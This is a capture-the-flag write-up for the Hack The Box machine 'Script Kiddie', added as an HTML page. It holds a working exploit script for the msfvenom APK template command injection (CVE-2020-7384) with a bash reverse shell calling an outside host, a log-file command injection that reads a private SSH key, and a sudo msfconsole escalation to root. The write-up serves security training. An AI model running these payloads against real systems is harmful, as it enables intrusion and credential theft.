@@ -1,0 +1,331 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Script Kiddie</title>
+<meta name="generator" content="Org mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Script Kiddie</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgb3a78e8">Enumeration</a></li>
+<li><a href="#org3b956c2">User Flag</a></li>
+<li><a href="#orgd9ed3a0">Root Flag</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgb3a78e8" class="outline-2">
+<h2 id="orgb3a78e8">Enumeration</h2>
+<div class="outline-text-2" id="text-orgb3a78e8">
+<p>
+As usual, we start with an Nmap scan:
+</p>
+
+<pre class="example">
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 20:32 WET
+$ nmap -sC -sV -p1-65535 -oN nmapresult.txt 10.129.74.36
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 20:32 WET
+Nmap scan report for 10.129.74.36
+Host is up (0.046s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
+|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
+|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
+5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+|_http-title: k1d'5 h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.20 seconds
+</pre>
+
+<p>
+We can clearly see that there is an HTTP server running in port <code>5000</code>.
+Going to the website (<code>10.129.75.138:5000</code>), we see this page:
+</p>
+
+
+<div id="orga074863" class="figure">
+<p><img src="./images/img1.jpg" alt="img1.jpg" />
+</p>
+</div>
+
+<p>
+Messing around with the website, we can scan the top 100 ports of a specific IP
+address, we can also generate <code>msfvenom</code> binaries and we can search exploits.
+</p>
+
+<p>
+There are some timesinks here, one of them being command injection checking on
+all three available fields. I did waste many hours because of it.
+</p>
+
+<p>
+But let us not forget about the commands that are running server-side.
+From the website, we know that the server is running <code>nmap</code>, <code>msfvenom</code> and
+<code>searchsploit</code>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org3b956c2" class="outline-2">
+<h2 id="org3b956c2">User Flag</h2>
+<div class="outline-text-2" id="text-org3b956c2">
+<p>
+Using the <code>searchsploit</code> utility from the website, we can search <code>nmap</code> or
+<code>msfvenom</code> exploits. <code>Nmap</code> has a couple exploits, but <code>msfvenom</code> has one that
+is very recent, January 2021: <a href="https://www.exploit-db.com/exploits/49491">https://www.exploit-db.com/exploits/49491</a>.
+</p>
+
+<p>
+It seems that we can use an Android APK template to make <code>msfvenom</code> execute
+arbitrary code when it is generating the binary.
+</p>
+
+<p>
+We’ll use the above python script, but in our case, we want a payload for a
+reverse shell: <code>/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.210/1337 0&gt;&amp;1"</code>.
+We just replace it in the script and run it. But it will error out, because
+there seems to be a problem when using <code>keytool</code> and having <code>+</code> characters in
+<code>dname</code>.
+Script customization is needed. In this case, after getting the result base64,
+we’ll convert the string to an hex string and we also change the dname variable
+so it converts from hex string to base64 and then decode the base64 and then
+execute the resulting string.
+</p>
+
+<p>
+This is the script after the changes:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection</span>
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">Exploit Author: Justin Steven</span>
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">Vendor Homepage: https://www.metasploit.com/</span>
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">Software Link: https://www.metasploit.com/</span>
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0</span>
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">CVE : CVE-2020-7384</span>
+
+<span style="color: #7c6f64;">#</span><span style="color: #7c6f64;">!/usr/bin/env python3</span>
+<span style="color: #fb4933;">import</span> subprocess
+<span style="color: #fb4933;">import</span> tempfile
+<span style="color: #fb4933;">import</span> os
+<span style="color: #fb4933;">from</span> base64 <span style="color: #fb4933;">import</span> b64encode
+
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">Change me</span>
+<span style="color: #7c6f64;">#</span><span style="color: #7c6f64;">payload = 'echo "Code execution as $(id)" &gt; /tmp/win'</span>
+<span style="color: #83a598;">payload</span> = <span style="color: #b8bb26;">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.210/1337 0&gt;&amp;1"'</span>
+
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">b64encode to avoid badchars (keytool is picky)</span>
+<span style="color: #83a598;">payload_b64</span> = b64encode(payload.encode()).decode()
+<span style="color: #83a598;">payload_hex</span> = <span style="color: #b8bb26;">""</span>.join(<span style="color: #b8bb26;">"{:02x}"</span>.<span style="color: #fe8019;">format</span>(<span style="color: #fe8019;">ord</span>(c)) <span style="color: #fb4933;">for</span> c <span style="color: #fb4933;">in</span> payload_b64)
+
+<span style="color: #7c6f64;">#</span><span style="color: #7c6f64;">dname = f"CN='|echo {payload_b64} | base64 -d | sh #"</span>
+<span style="color: #83a598;">dname</span> = f<span style="color: #b8bb26;">"CN='|echo </span>{payload_hex}<span style="color: #b8bb26;"> | xxd -r -p | base64 -d | sh #"</span>
+
+<span style="color: #fb4933;">print</span>(f<span style="color: #b8bb26;">"[+] Manufacturing evil apkfile"</span>)
+<span style="color: #fb4933;">print</span>(f<span style="color: #b8bb26;">"Payload: </span>{payload}<span style="color: #b8bb26;">"</span>)
+<span style="color: #fb4933;">print</span>(f<span style="color: #b8bb26;">"-dname: </span>{dname}<span style="color: #b8bb26;">"</span>)
+<span style="color: #fb4933;">print</span>()
+
+tmpdir = tempfile.mkdtemp()
+<span style="color: #83a598;">apk_file</span> = os.path.join(tmpdir, <span style="color: #b8bb26;">"evil.apk"</span>)
+<span style="color: #83a598;">empty_file</span> = os.path.join(tmpdir, <span style="color: #b8bb26;">"empty"</span>)
+<span style="color: #83a598;">keystore_file</span> = os.path.join(tmpdir, <span style="color: #b8bb26;">"signing.keystore"</span>)
+<span style="color: #83a598;">storepass</span> = <span style="color: #83a598;">keypass</span> = <span style="color: #b8bb26;">"password"</span>
+<span style="color: #83a598;">key_alias</span> = <span style="color: #b8bb26;">"signing.key"</span>
+
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">Touch empty_file</span>
+<span style="color: #fe8019;">open</span>(empty_file, <span style="color: #b8bb26;">"w"</span>).close()
+
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">Create apk_file</span>
+subprocess.check_call([<span style="color: #b8bb26;">"zip"</span>, <span style="color: #b8bb26;">"-j"</span>, apk_file, empty_file])
+
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">Generate signing key with malicious -dname</span>
+subprocess.check_call([<span style="color: #b8bb26;">"keytool"</span>, <span style="color: #b8bb26;">"-genkey"</span>, <span style="color: #b8bb26;">"-keystore"</span>, keystore_file, <span style="color: #b8bb26;">"-alias"</span>, key_alias, <span style="color: #b8bb26;">"-storepass"</span>, storepass,
+                       <span style="color: #b8bb26;">"-keypass"</span>, keypass, <span style="color: #b8bb26;">"-keyalg"</span>, <span style="color: #b8bb26;">"RSA"</span>, <span style="color: #b8bb26;">"-keysize"</span>, <span style="color: #b8bb26;">"2048"</span>, <span style="color: #b8bb26;">"-dname"</span>, dname])
+
+<span style="color: #7c6f64;"># </span><span style="color: #7c6f64;">Sign APK using our malicious dname</span>
+subprocess.check_call([<span style="color: #b8bb26;">"jarsigner"</span>, <span style="color: #b8bb26;">"-sigalg"</span>, <span style="color: #b8bb26;">"SHA1withRSA"</span>, <span style="color: #b8bb26;">"-digestalg"</span>, <span style="color: #b8bb26;">"SHA1"</span>, <span style="color: #b8bb26;">"-keystore"</span>, keystore_file,
+                       <span style="color: #b8bb26;">"-storepass"</span>, storepass, <span style="color: #b8bb26;">"-keypass"</span>, keypass, apk_file, key_alias])
+
+<span style="color: #fb4933;">print</span>()
+<span style="color: #fb4933;">print</span>(f<span style="color: #b8bb26;">"[+] Done! apkfile is at </span>{apk_file}<span style="color: #b8bb26;">"</span>)
+<span style="color: #fb4933;">print</span>(f<span style="color: #b8bb26;">"Do: msfvenom -x </span>{apk_file}<span style="color: #b8bb26;"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null"</span>)
+</pre>
+</div>
+
+<p>
+All we have to do now is run the script and upload the result APK to the
+website:
+</p>
+
+
+<div id="orgf7220c3" class="figure">
+<p><img src="./images/img2.jpg" alt="img2.jpg" />
+</p>
+</div>
+
+<p>
+When we get the reverse shell, we can see that there is a <code>id_rsa</code> file in the
+<code>.ssh</code> directory, we get the contents of the file and we use it to ssh into the
+user <code>kid</code>:
+</p>
+
+
+<div id="org94c3ecb" class="figure">
+<p><img src="./images/img3.jpg" alt="img3.jpg" />
+</p>
+</div>
+
+<p>
+In <code>kid</code> home directory, we can get the <code>user.txt</code> flag.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgd9ed3a0" class="outline-2">
+<h2 id="orgd9ed3a0">Root Flag</h2>
+<div class="outline-text-2" id="text-orgd9ed3a0">
+<p>
+There are some rabbit holes we can get into. We can rapidly see that there is an
+odd file (<code>/home/kid/logs/hackers</code>).
+The file is referenced in the websites’ <code>app.py</code> file:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #fb4933;">def</span> <span style="color: #fabd2f;">searchsploit</span>(text, srcip):
+    <span style="color: #fb4933;">if</span> regex_alphanum.match(text):
+        <span style="color: #83a598;">result</span> = subprocess.check_output([<span style="color: #b8bb26;">'searchsploit'</span>, <span style="color: #b8bb26;">'--color'</span>, text])
+        <span style="color: #fb4933;">return</span> render_template(<span style="color: #b8bb26;">'index.html'</span>, searchsploit=result.decode(<span style="color: #b8bb26;">'UTF-8'</span>, <span style="color: #b8bb26;">'ignore'</span>))
+    <span style="color: #fb4933;">else</span>:
+        <span style="color: #fb4933;">with</span> <span style="color: #fe8019;">open</span>(<span style="color: #b8bb26;">'/home/kid/logs/hackers'</span>, <span style="color: #b8bb26;">'a'</span>) <span style="color: #fb4933;">as</span> f:
+            f.write(f<span style="color: #b8bb26;">'[</span>{datetime.datetime.now()}<span style="color: #b8bb26;">] </span>{srcip}<span style="color: #b8bb26;">\n'</span>)
+        <span style="color: #fb4933;">return</span> render_template(<span style="color: #b8bb26;">'index.html'</span>, sserror=<span style="color: #b8bb26;">"stop hacking me - well hack you back"</span>)
+</pre>
+</div>
+
+<p>
+So, if we use special characters in the prompt, it will write current date and
+our IP to <code>/home/kid/logs/hackers</code>. For the sake of brevity, we are
+going to upload <code>pspy64</code> to the machine and run it. Now, in the website, if we
+use the <code>searchsploit</code> textfield with a special character (e.g.: <code>test;</code>), we
+can clearly see what commands are executed on the server:
+</p>
+
+
+<div id="orgdc516b0" class="figure">
+<p><img src="./images/img4.jpg" alt="img4.jpg" />
+</p>
+</div>
+
+<p>
+Everytime the above happens, it seems <code>/home/pwn/scanlosers.sh</code> is executed.
+We can peek into that file:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-bash"><span style="color: #7c6f64;">#</span><span style="color: #7c6f64;">!/bin/</span><span style="color: #fb4933;">bash</span>
+
+<span style="color: #83a598;">log</span>=/home/kid/logs/hackers
+
+<span style="color: #fe8019;">cd</span> /home/pwn/
+cat $<span style="color: #83a598;">log</span> | cut -d<span style="color: #b8bb26;">' '</span> -f3- | sort -u | <span style="color: #fb4933;">while </span><span style="color: #fe8019;">read</span> ip; <span style="color: #fb4933;">do</span>
+    sh -c <span style="color: #b8bb26;">"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null"</span> &amp;
+<span style="color: #fb4933;">done</span>
+
+<span style="color: #fb4933;">if</span> [[ $(wc -l &lt; $<span style="color: #83a598;">log</span>) -gt 0 ]]; <span style="color: #fb4933;">then </span><span style="color: #fe8019;">echo</span> -n &gt; $<span style="color: #83a598;">log</span>; <span style="color: #fb4933;">fi</span>
+</pre>
+</div>
+
+<p>
+This file gets <code>/home/kid/logs/hackers</code>, does a cut by space character, gets
+everything from the third free onwards and executes nmap. After that, it cleans
+the log file.
+From here, we can inject commands into <code>/home/kid/logs/hackers</code> for user <code>pwn</code>
+to execute! But we have to be smart about it. We can continue using <code>pspy64</code> to
+check what is executed and to do some trial and error. My initial idea was to
+get the <code>id_rsa</code> from user <code>pwn</code>. All I had to do was run this command:
+</p>
+
+<pre class="example">
+$ echo ";a; a; ;cat .ssh/id_rsa &gt; test;" &gt; logs/hackers
+</pre>
+
+<p>
+I did insert enough whitespaces because of <code>cut -d’ ‘ -f3-</code> part. Then the
+command I wanted to execute (print <code>id_rsa</code> and redirect output to <code>test</code> file
+and then redirect everything to <code>/home/kid/logs/hackers</code>).
+</p>
+
+
+<div id="orgd911ab0" class="figure">
+<p><img src="./images/img5.jpg" alt="img5.jpg" />
+</p>
+</div>
+
+<p>
+We get the result and save a new <code>id_rsa</code> in our computer and <code>ssh</code> into <code>pwn</code>.
+</p>
+
+
+<div id="orga51733b" class="figure">
+<p><img src="./images/img6.jpg" alt="img6.jpg" />
+</p>
+</div>
+
+<p>
+Something that should be done right away is check if <code>pwn</code> user can run some
+commands as superuser!
+</p>
+
+<pre class="example">
+$ sudo -l
+
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+</pre>
+
+<p>
+It is possible to execute <code>msfconsole</code> as superuser. We can also run
+normal bash commands through msfconsole. Therefore, we just execute <code>bash</code> and
+we get a shell session with root permissions.
+</p>
+
+
+<div id="org92372ac" class="figure">
+<p><img src="./images/img7.jpg" alt="img7.jpg" />
+</p>
+</div>
+
+<p>
+Navigation to <code>root</code> home directory is required and then we have <code>root.txt</code> to
+get the root flag.
+</p>
+
+<hr>
+<footer>
+<p><a class="footer" href="/index.html">Homepage</a></p>
+<p><a class="footer" href="htb/index.html">Back</a></p>
+</footer>
+</div>
+</div>
+</div>
+</body>
+</html>
